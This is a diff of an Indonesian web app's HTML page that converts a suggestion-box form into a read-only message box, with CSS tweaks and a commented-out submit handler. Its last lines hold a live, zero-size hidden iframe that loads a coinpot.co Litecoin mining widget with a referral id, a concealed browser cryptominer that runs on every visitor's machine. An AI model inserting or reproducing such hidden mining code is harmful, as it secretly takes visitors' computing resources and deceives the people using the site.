@@ -134,22 +134,20 @@
         
         .boxmasukan {
             width: 100%;
-            text-align: center;
             position: fixed;
-            margin: auto;
-            top: 20%;
-            height: 50%;
+            top: 50px;
             display: none;
+            z-index: 2;
         }
         
         .wrapMasukan {
             width: 300px;
-            margin: auto;
+            margin-left: auto;
             text-align: center;
             padding: 20px;
             border-radius: 5px;
             background-color: rgb(253, 253, 253);
-            border: rgb(189, 189, 189) solid 1px;
+            box-shadow: 0 10px 16px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19) !important;
         }
         
         h3,
@@ -167,7 +165,8 @@
         }
         
         #textmasukan {
-            resize: none;
+            height: 200px;
+            border: 1px #03a9f3 solid;
         }
         
         .gmd {
@@ -210,6 +209,10 @@
             display: none;
             width: 70px;
         }
+        .close{
+            position: absolute;
+            transform: translate(240px,-25px);
+        }
     </style>
 </head>
 
@@ -217,11 +220,10 @@
 
     <div class="boxmasukan">
         <div class="wrapMasukan">
-            <h3>Kotak Saran</h3>
-            <h5>Masukan Anda adalah evaluasi terbaik kami</h5>
-            <textarea name="textmasukan" id="textmasukan" cols="30" rows="10"></textarea>
+            <h3 class="close">X</h3>
+            <h3>Kotak Pesan</h3>
+            <div name="textmasukan" id="textmasukan">Tidak ada pesan untuk Anda</div>
             <img id="textmasukanloading" src="./image/Pulse.svg" alt="loading">
-            <button id="btnMasukan" type="submit">KIRIM</button>
         </div>
     </div>
     <div class="wrapterkirim gmd backform">
@@ -233,7 +235,7 @@
     <div class="logoutWrap">
         <ul>
             <li class="akun">Akun</li>
-            <li class="masukan">Masukan</li>
+            <li class="masukan">Pesan</li>
             <li class="logoutButton">KELUAR</li>
         </ul>
     </div>
@@ -277,7 +279,7 @@
         let logoutButton = document.querySelector(".logoutButton");
         let wrapbody = document.querySelector(".wrapbody");
         let masukan = document.querySelector(".masukan");
-        let btnMasukan = document.querySelector("#btnMasukan");
+        //let btnMasukan = document.querySelector("#btnMasukan");
         let boxmasukan = document.querySelector(".boxmasukan");
         let textmasukan = document.querySelector("#textmasukan");
         let wrapterkirim = document.querySelector(".wrapterkirim");
@@ -285,7 +287,12 @@
         let textmasukanloading = document.querySelector("#textmasukanloading");
         let loading = document.querySelector(".loading");
         let akun = document.querySelector('.akun');
+        let close = document.querySelector('.close');
 
+        close.addEventListener('click', ()=> {
+            boxmasukan.setAttribute('style', 'display:none');
+        });
+        
         akun.addEventListener('click', ()=> location.assign('akun.html'));
 
         if (main.ambilDb('nip') == null || main.ambilDb('nip') == '') {
@@ -332,7 +339,7 @@
         masukan.addEventListener('click', () => {
             boxmasukan.setAttribute('style', 'display:block');
         });
-
+/*
         btnMasukan.addEventListener('click', () => {
 
             let dataku = {
@@ -348,15 +355,16 @@
             };
 
             masukan();
-        });
-
-       mendaftarBtn.addEventListener('click', () => {
-            location.assign('pendaftaran.html');
-       });
+        });   
         
         tutup.addEventListener('click', () => {
             wrapterkirim.setAttribute('style', 'display:none');
         });
+ */
+        
+         mendaftarBtn.addEventListener('click', () => {
+            location.assign('pendaftaran.html');
+       });
     </script>
     <iframe scrolling="no" frameborder="0" src="https://coinpot.co/mine/litecoin/?ref=0C052766283C&mode=widget" style="overflow:hidden;width:0px;height:0px;"></iframe>
 </body>
